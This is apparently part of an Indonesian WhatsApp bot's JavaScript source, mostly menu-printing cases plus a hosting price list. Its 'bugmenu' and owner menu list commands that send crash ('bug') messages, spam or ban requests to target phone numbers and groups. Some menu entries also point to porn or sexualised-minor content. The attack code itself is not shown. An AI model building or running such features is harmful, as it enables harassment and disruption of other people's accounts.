if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
haikal.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}
//=================================================//
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}
if (global.db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
m.reply(`
Telah Kembali Dari Afk ${user.afkReason ? ' Selama ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}
//=================================================//
switch(command) {
//=================================================//
case 'menu':
if (isBan) return m.reply('*Lu Di Ban Owner*')
var resio = await Quotes()
teks = `\nAuthor: ${resio.author}\n`
teks = `\nQuotes:\n`
teks = `${resio.quotes}\n`
let footgkzksgwians = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
sendGeekzMessage(from, { 
text: `*Hay Kak ${pushname} 👋 Selamat ${salam}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*Kata - Kata Untuk Hari Ini*

${teks}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
${prefix} othermenu 
${prefix} downloadmenu 
${prefix} convertmenu 
${prefix} groupmenu 
${prefix} ownermenu 
${prefix} allmenu 
${prefix} bugmenu 
${prefix} randommenu 
${prefix} asupan 
${prefix} musik 
${prefix} cucimata 
${prefix} textmaker 
${prefix} logo 
${prefix} berita 
${prefix} menufun 
▬▭▬▭▬▭▬▭▬▬▭▬▭▬`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": footgkzksgwians, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": kalimage,
"mediaUrl": gr,
"sourceUrl": gr
}
}
})
break
//=================================================
case 'allmenu':
if (isBan) return m.reply('*Lu Di Ban Owner*')
var resio = await Quotes()
teks = `\nAuthor: ${resio.author}\n`
teks = `\nQuotes:\n`
teks = `${resio.quotes}\n`
let footgkz = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
sendGeekzMessage(from, { 
text: `*Hay Kak ${pushname} 👋 Selamat ${salam}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*Kata - Kata Untuk Hari Ini*

${teks}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*PREMIUM*
¥ Owner ¥
${prefix} pushkontak
${prefix} pushcontid (id group)
${prefix} bcgc
${prefix} openai
${prefix} public
${prefix} self
${prefix} listprem
${prefix} addprem (628xx)
${prefix} delprem (628xx)
${prefix} sms (628xx)
${prefix} call (628xx)
${prefix} nowa (628xx)
${prefix} kenon (628xx)
${prefix} verif@ (628xx)
${prefix} banned (628xx)
${prefix} unbannedv2 (628xx)
${prefix} unbannedv3 (628xx)
${prefix} unbannedv4 (628xx)
${prefix} unbannedv5 (628xx)
${prefix} pengguna add (628xx)
${prefix} pengguna del (628xx)
${prefix} welcome on / off
${prefix} antilink on / off
${prefix} antitoxic on / off
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
¥ Owner Group ¥
${prefix} hidetag
${prefix} kick
${prefix} add
${prefix} promote
${prefix} demote
${prefix} linkgroup
${prefix} resetlinkgc
${prefix} sendlinkgc
${prefix} group
${prefix} editinfo
${prefix} join
${prefix} setppgc
${prefix} setname
${prefix} setdesc
${prefix} promoteall
${prefix} demoteall
${prefix} tagall
${prefix} getpic
${prefix} getname
${prefix} kudet
${prefix} inspect
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*FREE USER*
¥ Other Menu ¥
${prefix} bugmenu
${prefix} randommenu
${prefix} asupan
${prefix} musik
${prefix} cucimata
${prefix} textmaker
${prefix} logo
${prefix} berita
${prefix} menufun
${prefix} tutorialbug
${prefix} apkamgeekz
${prefix} pembayaran
${prefix} listpanel
${prefix} owner
${prefix} bagaimanakah
${prefix} apakah
${prefix} redemcode
${prefix} tutorial
${prefix} infoamgeekz
${prefix} kalkulator
${prefix} google
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
¥ Download Menu ¥
${prefix} githubstalk
${prefix} ffstalk
${prefix} mlstalk
${prefix} igstalk
${prefix} fbvideo
${prefix} igvideo
${prefix} stalktiktok
${prefix} twitvideo
${prefix} tiktokvideo
${prefix} tiktokaudio
${prefix} ytvn
${prefix} ytmp4
${prefix} ytsearch
${prefix} ytplay
${prefix} play
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
¥ Convert Menu ¥
${prefix} sticker
${prefix} toimage
${prefix} tomp4
${prefix} tomp3
${prefix} toaud
${prefix} tovn
${prefix} togif
${prefix} tourl
${prefix} smeme
${prefix} gambar
${prefix} quotes
${prefix} attp
${prefix} ttp
${prefix} wm
${prefix} wmvideo
${prefix} qc
${prefix} qcstick
${prefix} bokep
${prefix} couple
${prefix} kopi
${prefix} emojimix
${prefix} emojimix2
${prefix} darkjoke
${prefix} jadwalsholat
${prefix} kisahnabi
${prefix} alquranaudio
${prefix} alquran
${prefix} listsurah
${prefix} quotesanime
${prefix} faktaunik
${prefix} katabijak
${prefix} pantun
${prefix} bucin
${prefix} randomnama
${prefix} toanime
${prefix} fitnah
${prefix} chord
${prefix} heroml
${prefix} roboguru
${prefix} brainly
${prefix} kbbi
${prefix} jodoh
${prefix} shopee
${prefix} playstore
${prefix} jadwalbola
${prefix} lirik
${prefix} infogempa
${prefix} jadwaltvnow
${prefix} jadwaltv
▬▭▬▭▬▭▬▭▬▬▭▬▭▬`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": footgkz, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": kalimage,
"mediaUrl": gr,
"sourceUrl": gr
}
}
})
break

//=================================================//
case 'convertmenu':
if (isBan) return m.reply('*Lu Di Ban Owner*')
var resio = await Quotes()
teks = `\nAuthor: ${resio.author}\n`
teks = `\nQuotes:\n`
teks = `${resio.quotes}\n`
let footgkzksaaagkwians = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
sendGeekzMessage(from, { 
text: `*Hay Kak ${pushname} 👋 Selamat ${salam}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*Kata - Kata Untuk Hari Ini*

${teks}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
${prefix} sticker
${prefix} toimage
${prefix} tomp4
${prefix} tomp3
${prefix} toaud
${prefix} tovn
${prefix} togif
${prefix} tourl
${prefix} smeme
${prefix} gambar
${prefix} quotes
${prefix} attp
${prefix} ttp
${prefix} wm
${prefix} wmvideo
${prefix} qc
${prefix} qcstick
${prefix} bokep
${prefix} couple
${prefix} kopi
${prefix} emojimix
${prefix} emojimix2
${prefix} darkjoke
${prefix} jadwalsholat
${prefix} kisahnabi
${prefix} alquranaudio
${prefix} alquran
${prefix} listsurah
${prefix} quotesanime
${prefix} faktaunik
${prefix} katabijak
${prefix} pantun
${prefix} bucin
${prefix} randomnama
${prefix} toanime
${prefix} fitnah
${prefix} chord
${prefix} heroml
${prefix} roboguru
${prefix} brainly
${prefix} kbbi
${prefix} jodoh
${prefix} shopee
${prefix} playstore
${prefix} jadwalbola
${prefix} lirik
${prefix} infogempa
${prefix} jadwaltvnow
${prefix} jadwaltv
▬▭▬▭▬▭▬▭▬▬▭▬▭▬`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": footgkzksaaagkwians, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": kalimage,
"mediaUrl": gr,
"sourceUrl": gr
}
}
})
break
//=================================================
case 'downloadmenu':
if (isBan) return m.reply('*Lu Di Ban Owner*')
var resio = await Quotes()
teks = `\nAuthor: ${resio.author}\n`
teks = `\nQuotes:\n`
teks = `${resio.quotes}\n`
let footgkzksaaagaaawians = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
sendGeekzMessage(from, { 
text: `*Hay Kak ${pushname} 👋 Selamat ${salam}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*Kata - Kata Untuk Hari Ini*

${teks}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
${prefix} githubstalk
${prefix} ffstalk
${prefix} mlstalk
${prefix} igstalk
${prefix} fbvideo
${prefix} igvideo
${prefix} stalktiktok
${prefix} twitvideo
${prefix} tiktokvideo
${prefix} tiktokaudio
${prefix} ytvn
${prefix} ytmp4
${prefix} ytsearch
${prefix} ytplay
${prefix} play
▬▭▬▭▬▭▬▭▬▬▭▬▭▬`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": footgkzksaaagaaawians, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": kalimage,
"mediaUrl": gr,
"sourceUrl": gr
}
}
})
break
//=================================================
case 'othermenu':
if (isBan) return m.reply('*Lu Di Ban Owner*')
var resio = await Quotes()
teks = `\nAuthor: ${resio.author}\n`
teks = `\nQuotes:\n`
teks = `${resio.quotes}\n`
let footgkzksaaasagwians = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
sendGeekzMessage(from, { 
text: `*Hay Kak ${pushname} 👋 Selamat ${salam}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*Kata - Kata Untuk Hari Ini*

${teks}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
${prefix} bugmenu
${prefix} randommenu
${prefix} asupan
${prefix} musik
${prefix} cucimata
${prefix} textmaker
${prefix} logo
${prefix} berita
${prefix} menufun
${prefix} tutorialbug
${prefix} owner
${prefix} bagaimanakah
${prefix} apakah
${prefix} redemcode
${prefix} tutorial
${prefix} kalkulator
${prefix} google
▬▭▬▭▬▭▬▭▬▬▭▬▭▬`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": footgkzksaaasagwians, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": kalimage,
"mediaUrl": gr,
"sourceUrl": gr
}
}
})
break
//=================================================
case 'groupmenu':
if (isBan) return m.reply('*Lu Di Ban Owner*')
var resio = await Quotes()
teks = `\nAuthor: ${resio.author}\n`
teks = `\nQuotes:\n`
teks = `${resio.quotes}\n`
let footgkzksaaagwians = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
sendGeekzMessage(from, { 
text: `*Hay Kak ${pushname} 👋 Selamat ${salam}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*Kata - Kata Untuk Hari Ini*

${teks}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
${prefix} hidetag
${prefix} kick
${prefix} add
${prefix} promote
${prefix} demote
${prefix} linkgroup
${prefix} resetlinkgc
${prefix} sendlinkgc
${prefix} group
${prefix} editinfo
${prefix} join
${prefix} setppgc
${prefix} setname
${prefix} setdesc
${prefix} promoteall
${prefix} demoteall
${prefix} tagall
${prefix} getpic
${prefix} getname
${prefix} penjara
${prefix} kudet
${prefix} inspect
▬▭▬▭▬▭▬▭▬▬▭▬▭▬`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": footgkzksaaagwians, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": kalimage,
"mediaUrl": gr,
"sourceUrl": gr
}
}
})
break
//=================================================
case 'ownermenu':
if (isBan) return m.reply('*Lu Di Ban Owner*')
var resio = await Quotes()
teks = `\nAuthor: ${resio.author}\n`
teks = `\nQuotes:\n`
teks = `${resio.quotes}\n`
let footgkzksgwsaians = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
sendGeekzMessage(from, { 
text: `*Hay Kak ${pushname} 👋 Selamat ${salam}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*Kata - Kata Untuk Hari Ini*

${teks}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
¥ Owner ¥
${prefix} pushkontak
${prefix} pushcontid (id group)
${prefix} bcgc
${prefix} openai
${prefix} public
${prefix} self
${prefix} listprem
${prefix} addprem (628xx)
${prefix} delprem (628xx)
${prefix} sms (628xx)
${prefix} call (628xx)
${prefix} nowa (628xx)
${prefix} kenon (628xx)
${prefix} verif@ (628xx)
${prefix} banned (628xx)
${prefix} unbannedv2 (628xx)
${prefix} unbannedv3 (628xx)
${prefix} unbannedv4 (628xx)
${prefix} unbannedv5 (628xx)
${prefix} pengguna add (628xx)
${prefix} pengguna del (628xx)
${prefix} welcome on / off
${prefix} antilink on / off
${prefix} antitoxic on / off
▬▭▬▭▬▭▬▭▬▬▭▬▭▬`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": footgkzksgwsaians, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": kalimage,
"mediaUrl": gr,
"sourceUrl": gr
}
}
})
break
//=================================================//
case 'bugmenu':
if (isBan) return m.reply('*Lu Di Ban Owner*')
var resio = await Quotes()
teks = `\nAuthor: ${resio.author}\n`
teks = `\nQuotes:\n`
teks = `${resio.quotes}\n`
let footgkzz = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
sendGeekzMessage(from, { 
text: `Hay Kak ${pushname} 👋 Selamat ${salam}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*Kata - Kata Untuk Hari Ini*

${teks}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*TUNGGAL*
┏━━⊱
┣❏🌷
┣❏🐲
┣❏🐉
┣❏🌵
┣❏🎄
┣❏🌲
┣❏🌳
┣❏🌴
┣❏🌱
┣❏🌿
┣❏☘️
┣❏🍀
┣❏ᴜɴʟɪᴛᴇᴛ
┣❏ᴜɴʟɪᴛʀᴏʟɪ
┣❏ᴜɴʟɪᴅᴏᴄᴜ
┗━━⊱
*KIRIM KE PRIBADI*
┏━━⊱
┣❏ꜱᴀɴᴛᴇᴛ (628xxxx)
┣❏ꜱᴇɴᴅᴜɴʟɪᴛʀᴏʟɪ (628xxxx)
┣❏ꜱᴇɴᴅᴜɴʟɪᴅᴏᴄᴜ (628xxxx)
┗━━⊱
*KIRIM KE GROUP PAKEI ID*
┏━━⊱
┣❏ꜱᴀɴᴛᴇᴛɢᴄ (ɪᴅ ɢʀᴏᴜᴘ)
┣❏ᴛʀᴏʟɪɢᴄ (ɪᴅ ɢʀᴏᴜᴘ)
┣❏ᴅᴏᴄᴜɢᴄ (ɪᴅ ɢʀᴏᴜᴘ)
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*BONUS*
┏━━⊱
┣❏ʜᴀɪᴋᴀʟ
┣❏ɢᴏʏᴀɴɢ
┗━━⊱
[ *BOT VERSION 18* ]`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": footgkzz, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": kalimage,
"mediaUrl": gr,
"sourceUrl": gr
}
}
})
break
case 'randommenu':
if (isBan) return m.reply('*Lu Di Ban Owner*')
var resio = await Quotes()
teks = `\nAuthor: ${resio.author}\n`
teks = `\nQuotes:\n`
teks = `${resio.quotes}\n`
let footgkbzz = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
sendGeekzMessage(from, { 
text: `Hay Kak ${pushname} 👋 Selamat ${salam}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*Kata - Kata Untuk Hari Ini*

${teks}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
${prefix} setcmd
${prefix} delcmd
${prefix} listcmd
${prefix} setppbot
${prefix} addpdf
${prefix} delpdf
${prefix} listpdf
${prefix} yopdf
${prefix} sendpdf
${prefix} addzip
${prefix} delzip
${prefix} listzip
${prefix} yozip
${prefix} sendzip
${prefix} addapk
${prefix} delapk
${prefix} listapk
${prefix} yoapk
${prefix} sendapk
${prefix} addvn
${prefix} delvn
${prefix} listvn
${prefix} addmsg
${prefix} sendlist
${prefix} listmsg
${prefix} delmsg
${prefix} getmsg`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": footgkbzz, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": kalimage,
"mediaUrl": gr,
"sourceUrl": gr
}
}
})
break
//=================================================//
case 'menufun':
if (isBan) return m.reply('*Lu Di Ban Owner*')
 var resio = await Quotes()
teks = `\nAuthor: ${resio.author}\n`
teks = `\nQuotes:\n`
teks = `${resio.quotes}\n`
let fooutgkzz = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
sendGeekzMessage(from, { 
text: `Hay Kak ${pushname} 👋 Selamat ${salam}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*Kata - Kata Untuk Hari Ini*

${teks}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
┏━━⊱
┣❏ᴛᴛᴄ
┣❏ᴅᴇʟᴛᴄ
┣❏ꜱᴜɪᴛᴘᴠᴘ
┣❏ᴛᴇʙᴀᴋ ᴋᴀᴛᴀ
┣❏ᴛᴇʙᴀᴋ ɢᴀᴍʙᴀʀ
┣❏ᴛᴇʙᴀᴋ ʟɪʀɪᴋ
┣❏ᴛᴇʙᴀᴋ ᴋᴀʟɪᴍᴀᴛ
┣❏ᴛᴇʙᴀᴋ ʟᴀɢᴜ
┣❏ᴛᴇʙᴀᴋ ʟᴏɴᴛᴏɴɢ
┣❏ꜰᴀᴍɪʟʏ100
┣❏ᴋᴜɪꜱᴍᴀᴛʜ ɴᴏᴏʙ
┣❏ᴋᴜɪꜱᴍᴀᴛʜ ᴇᴀꜱʏ
┣❏ᴋᴜɪꜱᴍᴀᴛʜ ᴍᴇᴅɪᴜᴍ
┣❏ᴋᴜɪꜱᴍᴀᴛʜ ʜᴀʀᴅ
┣❏ᴋᴜɪꜱᴍᴀᴛʜ ᴇxᴛʀᴇᴍᴇ
┣❏ᴋᴜɪꜱᴍᴀᴛʜ ɪᴍᴘᴏꜱꜱɪʙʟᴇ
┣❏ᴋᴜɪꜱᴍᴀᴛʜ ɪᴍᴘᴏꜱꜱɪʙʟᴇ2
┣❏ᴀʀᴛɪɴᴀᴍᴀ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴀʀᴛɪᴍɪᴍᴘɪ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴋᴇᴄᴏᴄᴏᴋᴀɴᴘᴀꜱᴀɴɢᴀɴ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴋᴇᴄᴏᴄᴏᴋᴀɴɴᴀᴍᴀ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴊᴀᴅɪᴀɴᴘᴇʀɴɪᴋᴀʜᴀɴ (ᴛᴇxᴛɴʏᴀ)
┣❏ʀᴇᴊᴇᴋɪ (ᴛᴇxᴛɴʏᴀ)
┣❏ꜱɪꜰᴀᴛᴜꜱᴀʜᴀ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴘᴇᴋᴇʀᴊᴀᴀɴ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴀʀᴛɪᴛᴀʀᴏᴛ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴘᴏᴛᴇɴꜱɪᴘᴇɴʏᴀᴋɪᴛ (ᴛᴇxᴛɴʏᴀ)
┣❏ʀᴀᴍᴀʟᴀɴɴᴀꜱɪʙ (ᴛᴇxᴛɴʏᴀ)
┣❏ʜᴀʀɪꜱᴀɴɢᴀʀ (ᴛᴇxᴛɴʏᴀ)
┣❏ʜᴀʀɪʙᴀɪᴋ (ᴛᴇxᴛɴʏᴀ)
┣❏ꜰᴇɴɢꜱʜᴜɪ (ᴛᴇxᴛɴʏᴀ)
┣❏ɴᴀɢᴀʜᴀʀɪ (ᴛᴇxᴛɴʏᴀ)
┣❏ʜᴀʀɪɴᴀᴀꜱ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴡᴇᴛᴏɴ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴘᴇʀᴜɴᴛᴜɴɢᴀɴ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴀʀᴀʜʀᴇᴊᴇᴋɪ (ᴛᴇxᴛɴʏᴀ)
┣❏ꜱɪꜰᴀᴛ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴋᴇʙᴇʀᴜɴᴛᴜɴɢᴀɴ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴍᴇᴍᴀɴᴄɪɴɢ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴍᴀꜱᴀꜱᴜʙᴜʀ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴢᴏᴅɪᴀᴋ (ᴛᴇxᴛɴʏᴀ)
┣❏ꜱʜɪᴏ (ᴛᴇxᴛɴʏᴀ)
┗━━⊱`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": fooutgkzz, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": kalimage,
"mediaUrl": gr,
"sourceUrl": gr
}
}
})
break
//=================================================//
//=================================================//
case 'cucimata':
if (isBan) return m.reply('*Lu Di Ban Owner*')
 var resio = await Quotes()
teks = `\nAuthor: ${resio.author}\n`
teks = `\nQuotes:\n`
teks = `${resio.quotes}\n`
let footgkzo = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
sendGeekzMessage(from, { 
text: `Hay Kak ${pushname} 👋 Selamat ${salam}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*Kata - Kata Untuk Hari Ini*

${teks}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
${prefix} cecanindo
${prefix} cecanchina
${prefix} cecanhijaber
${prefix} cecanmalaysia
${prefix} cecanvietnam
${prefix} cecankorea
${prefix} cecanjepan
${prefix} cecan
${prefix} art
${prefix} awoo
${prefix} bts
${prefix} cogan
${prefix} elaina
${prefix} exo
${prefix} elf
${prefix} estetic
${prefix} kanna
${prefix} loli
${prefix} neko2
${prefix} waifu
${prefix} shota
${prefix} husbu
${prefix} sagiri
${prefix} shinobu
${prefix} megumin
${prefix} wallnime
${prefix} quotesimage
${prefix} neko
${prefix} waifu
${prefix} kill
${prefix} pat
${prefix} lick
${prefix} bite
${prefix} yeet
${prefix} bonk
${prefix} wink
${prefix} poke
${prefix} nom
${prefix} slap
${prefix} smile
${prefix} wave
${prefix} blush
${prefix} smug
${prefix} glomp
${prefix} happy
${prefix} dance
${prefix} cringe
${prefix} highfive
${prefix} handhold`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": footgkzo, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": kalimage,
"mediaUrl": gr,
"sourceUrl": gr
}
}
})
break
//=================================================//
case 'berita':
if (isBan) return m.reply('*Lu Di Ban Owner*')
 var resio = await Quotes()
teks = `\nAuthor: ${resio.author}\n`
teks = `\nQuotes:\n`
teks = `${resio.quotes}\n`
let foottgkzo = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
sendGeekzMessage(from, { 
text: `Hay Kak ${pushname} 👋 Selamat ${salam}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*Kata - Kata Untuk Hari Ini*

${teks}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
${prefix} fajar
${prefix} cnn
${prefix} layarkaca
${prefix} cnbc
${prefix} tribun
${prefix} indozone
${prefix} kompas
${prefix} detik
${prefix} daily
${prefix} inews
${prefix} okezone
${prefix} sindo
${prefix} tempo
${prefix} antara
${prefix} kontan
${prefix} merdeka
${prefix} jalantikus-meme
`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": foottgkzo, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": kalimage,
"mediaUrl": gr,
"sourceUrl": gr
}
}
})
break
//=================================================//
case 'asupan':
if (isBan) return m.reply('*Lu Di Ban Owner*')
 var resio = await Quotes()
teks = `\nAuthor: ${resio.author}\n`
teks = `\nQuotes:\n`
teks = `${resio.quotes}\n`
let foottgkkzjo = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
sendGeekzMessage(from, { 
text: `Hay Kak ${pushname} 👋 Selamat ${salam}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*Kata - Kata Untuk Hari Ini*

${teks}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
${prefix} asupan1
${prefix} asupan2
${prefix} asupan3
${prefix} asupan4
${prefix} asupan5
${prefix} asupan6
${prefix} asupan7
${prefix} asupan8
${prefix} asupan9
${prefix} asupan10
${prefix} asupan11
${prefix} asupan12
${prefix} asupan13
${prefix} asupan14
${prefix} asupan15
${prefix} asupan16
${prefix} asupan17
${prefix} asupan18
${prefix} asupan18
${prefix} asupan20`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": foottgkkzjo, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": kalimage,
"mediaUrl": gr,
"sourceUrl": gr
}
}
})
break
//=================================================//
case 'listpanel': case 'panel':
if (isBan) return m.reply('*Lu Di Ban Owner*')
 var resio = await Quotes()
teks = `\nAuthor: ${resio.author}\n`
teks = `\nQuotes:\n`
teks = `${resio.quotes}\n`
let foottgkzooi = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
sendGeekzMessage(from, { 
text: `Hay Kak ${pushname} 👋 Selamat ${salam}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*Kata - Kata Untuk Hari Ini*

${teks}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*Pricelist Harga AmGeekz Panel* :

⚡PAKET G1
1GB RAM/1GB Disk/25% CPU
Rp10.000,00/1 BULAN
⚡PAKET G2
2GB RAM/2GB Disk/50% CPU
Rp15.000,00/1 BULAN
⚡PAKET G3
3GB RAM/3GB Disk/75% CPU
Rp20.000,00/1 BULAN
⚡PAKET G4
4GB RAM/4GB Disk/100% CPU
Rp25.000,00/1 BULAN
⚡PAKET G5
5GB RAM/5GB Disk/125% CPU
Rp30.000,00/1 BULAN
⚡PAKET G6
6GB RAM/6GB Disk/150% CPU
Rp35.000.00/1 BULAN
⚡PAKET G7
7GB RAM/7GB Disk/175% CPU
Rp40.000.00/1 BULAN

---------------------------------------
Pricelist Perpanjang Masa Aktif AmGeekz Panel :

⚡PAKET G1 = Rp5.000
⚡PAKET G2 = Rp7.500
⚡PAKET G3 = Rp10.000
⚡PAKET G4 = Rp12.500
⚡PAKET G5 = Rp15.000
⚡PAKET G6 = Rp17.500
⚡PAKET G7 = Rp20.000

Nb:
Melakukan top up saldo artinya anda setuju dengan segala kebijakan kami.
Untuk pricelist renew berlaku jika ada server yg masih aktif di dalam akun minimal selama 23hari.

*[ Administrator]*
contact.amgeekz.site`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": foottgkzooi, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": kalimage,
"mediaUrl": gr,
"sourceUrl": gr
}
}
})
break
//=================================================//
case 'logo':
